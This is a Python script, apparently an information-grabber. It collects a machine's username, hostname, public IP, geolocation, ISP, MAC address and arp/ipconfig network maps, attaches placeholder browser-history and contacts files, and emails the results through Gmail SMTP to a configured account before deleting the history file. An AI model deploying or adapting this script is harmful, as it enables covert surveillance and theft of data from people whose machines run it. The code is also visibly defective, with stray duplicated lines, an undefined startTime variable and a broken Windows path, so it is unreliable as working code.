import os
import sys
import platform
import datetime
import socket
import json
import time
import smtplib
import ssl
from email.message import EmailMessage
from requests import get
import geocoder
from uuid import getnode as get_mac

# Determine the OS for conditional operations
is_windows = platform.system() == "Windows"

# Path setup for cross-platform compatibility
history_path = os.path.join("C:", "tmp", "history.csv") if is_windows else os.path.join("/tmp", 
"history.csv")
contacts_path = os.path.join("C:", "tmp", "email_contacts.txt") if is_windows else \
                os.path.join("/tmp", "email_contacts.txt")

os.path.join("/tmp", "email_contacts.txt")

os.path.join("/tmp", "email_contacts.txt")

os.path.join("/tmp", "email_contacts.txt")

# Get OS and Timezone Information
print('Getting System and Timezone Information...')
my_os = platform.system()
my_os_extra = sys.platform
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)

# Fetch IP Information
print('Requesting IP Address Information...')
get_ip = get('https://api.ipify.org').content.decode('utf8')
response = get(f'http://ip-api.com/json/{get_ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,isp,reverse,proxy')
ip_json = response.json()  # This converts the response content to JSON
country_code = ip_json['country']

# Parse IP Information
country_code = ip_json['country']
city_name = ip_json['city']
region = ip_json['regionName']
zip_code = ip_json['zip']
district = ip_json['district']
reverse_dns = ip_json['reverse']
isp = ip_json['isp']
using_vpn = 'Yes' if ip_json['proxy'] else 'No'

# Get Local IP and MAC Address
print('Getting Local Network IP and MAC Address...')
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
mac_address = get_mac()

# System Commands
def run_command(command):
    import subprocess
    result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
    return result.stdout.decode('utf-8')

if is_windows:
    arp_output = run_command('arp -a')
    ipconfig_output = run_command('ipconfig')
else:
    arp_output = run_command('arp -a')
    ipconfig_output = run_command('ifconfig')

# Save Browser History and Contacts (Dummy functionality for cross-platform)
print('Saving Browser History and Contacts...')
with open(history_path, 'w') as f:
    f.write("Browser history placeholder")  # Dummy write for illustration
with open(contacts_path, 'w') as f:
    f.write("Contacts placeholder")  # Dummy write for illustration

# Compose Email Content
print('Composing Email Content...')
email_content = f"""
Device Name: {hostname}
Username: {os.getlogin()}
Operating System: {my_os}, {my_os_extra}

TIMEZONE INFO
System Timezone: {local_tzname}
System Time: {now}

IP ADDRESS INFO
Public IPV4 Address: {get_ip}
Internet Service Provider: {isp}
Reverse DNS of IP: {reverse_dns}
Using VPN: {using_vpn}

LOCAL NETWORK INFO
Local IP Address: {IPAddr}
Local MAC Address: {mac_address}

GEOLOCATION INFO (Inaccurate - bit.ly/ip_inaccuracy)
City: {city_name}, {region}, {country_code}
District: {district}
ZIP Code: {zip_code if zip_code else 'Not Detected'}
Lat/Long: {ip_json['lat']} {ip_json['lon']}

WINDOWS COMMAND OUTPUTS
Mapping Network Using arp -a command:
{arp_output}

Mapping Network Using ipconfig/ifconfig command:
{ipconfig_output}
"""

# Send the Email
print('Sending Email...')
sender = "YOUR EMAIL HERE"
recipient = sender
app_password = "YOUR EMAIL PASSWORD HERE"
msg = EmailMessage()
msg.set_content(email_content)
msg["Subject"] = f"Action From {city_name}, {country_code} Detected at {now}"
msg["From"] = sender
msg["To"] = recipient

with open(history_path, 'rb') as file:
    msg.add_attachment(file.read(), maintype='application', subtype='octet-stream', 
filename='history.csv')
with open(contacts_path, 'rb') as file:
    msg.add_attachment(file.read(), maintype='application', subtype='octet-stream', 
filename='contacts.txt')

context = ssl.create_default_context()
with smtplib.SMTP("smtp.gmail.com", port=587) as smtp:
    smtp.starttls(context=context)
    smtp.login(msg["From"], app_password)
    smtp.send_message(msg)

print('Email sent successfully.')
os.remove(history_path)
print('Cleanup complete.')
executionTime = (time.time() - startTime)
print('Script completed in:', executionTime, 'seconds')

